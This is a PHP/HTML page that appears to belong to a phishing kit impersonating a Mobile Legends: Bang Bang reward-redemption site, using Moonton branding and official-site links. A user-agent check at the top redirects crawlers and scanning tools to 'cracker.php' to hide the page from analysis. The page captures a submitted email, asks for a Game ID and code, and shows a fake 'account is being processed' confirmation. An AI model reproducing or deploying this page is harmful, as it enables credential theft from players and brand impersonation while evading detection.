<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="Mobile Legends: Bang Bang">
<meta name="description" content="Redeem your Mobile Legends: Bang Bang code and get free rewads">
<meta property="og:description" content="Redeem your Mobile Legends: Bang Bang code and get free rewads">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Mobile Legends: Bang Bang">
<meta property="og:type" content="website">
<meta name="copyright"content="Moonton">
<meta name="theme-color" content="#232427">
<meta property="og:image" content="https://i.ibb.co/C832Ykg/Capture.png">
<title>Mobile Legends: Bang Bang</title>
<link rel="stylesheet" href="https://mobilelegends-codexchange.herokuapp.com/css/style.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://m.mobilelegends.com/static/images/favicon.ico">
</head>
<body>

<div class="container">
<div class="header">
<img class="slider" src="https://s10.gifyu.com/images/Cinepolis-Banner.jpg">
<img class="slider" src="https://s10.gifyu.com/images/imagesfaef63de2f9601467502adc213c17e28.jpg">
<img class="slider" src="https://s10.gifyu.com/images/images-3c437c2a813ae4307815a97f28be4e23d.jpg">
<img class="slider" src="https://s10.gifyu.com/images/Screenshot-2022-01-11-at-10.12.10-PM-scaled-e16419194041386e75e4a45fa2d995.jpg">
<img class="slider" src="https://s10.gifyu.com/images/SLIDE-POSTER_01.jpg">
</div>
<ul>
<li>
<span>Redemption Code</span>
<input type="text" id="code" placeholder="">
</li>
<li>
<span>Game ID</span>
<input type="number" id="playid" placeholder="">
</li>
<p>Verification code will be sent to your in-game mailbox,vaild for 30 mins</p>
<button class="btn" type="submit"><span>Reedem</span></button>
</ul>
</div>

<div class="popup redemption_false">
<div class="popup-box">
<a href="https://m.mobilelegends.com/" class="popup-close"><i class="zmdi zmdi-close"></i></a>
<div class="nav-popup">
<div class="nav-popup-title">Redemption Status</div>
</div>
<div class="popup-alert">Your account is being processed<br>Please wait up to 24 hours</div>
<div class="popup-icon">
<i class="zmdi zmdi-check-circle"></i>
</div>
<button type="button" class="popup-btn" onclick="location.href='https://m.mobilelegends.com';">Logout</button>
</div>
</div>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://myrestapi.kazugawa.repl.co/slider.js"></script>
</body>
</html>	